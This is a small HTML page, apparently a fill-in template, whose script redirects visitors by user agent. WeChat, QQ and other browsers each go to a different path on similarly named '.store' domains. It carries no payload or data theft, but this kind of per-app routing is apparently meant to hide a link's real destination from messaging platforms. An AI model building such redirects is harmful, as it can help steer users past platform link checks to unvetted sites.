<!DOCTYPE html>
<html lang="zh-CN">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	</head>
	<body>
		<script type="text/javascript" charset="utf-8">
			let is_weixin_qq = (function() {
				let ua = navigator.userAgent.toLowerCase();
				if (ua.match(/MicroMessenger/i) == 'micromessenger') {
					//如果是微信则打开此链接   ！！按照书写标准写入到"内！！
					window.location.href = "http://www.yanxi50.store/ewmdy/"
				}else
				if (ua.match(/QQ/i) == 'qq') {
					//如果是QQ则打开此链接   ！！按照书写标准写入到"内！！
					window.location.href = "http://www.yanxi51.store/ewmdy/"
				} else {
					//如果不是微信也不是QQ则打开此链接   ！！按照书写标准写入到"内！！
					window.location.href = "http://www.yanxi58.store/ewmdy/"
				}
			})();
		</script>
	</body>
</html>
